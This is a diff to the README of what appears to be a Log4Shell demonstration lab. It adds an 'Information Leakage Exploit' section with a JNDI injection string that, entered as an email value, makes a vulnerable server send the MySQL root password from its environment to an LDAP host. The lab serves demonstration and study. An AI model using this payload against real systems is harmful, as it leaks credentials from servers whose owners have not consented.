@@ -28,6 +28,16 @@ echo $MYSQL_ROOT_PASSWORD
 secret
 ```
 
+### Information Leakage Exploit
+
+The CVE is still exploitable even if you disable remote code base url trust. 
+You can set this property to false inside `BiscuitsApplication.java` and inject the following 
+value as email : 
+
+```
+${jndi:ldap://snoopy-ldap-server:1389/${env:MYSQL_ROOT_PASSWORD}}
+```
+
 IT IS ESSENTIAL TO NOT USE DOCKER COMPOSE UP SNOOPY-NETCAT-LISTENER, see [this SO thread](https://stackoverflow.com/questions/36249744/interactive-shell-using-docker-compose).
 
 Dependencies : 
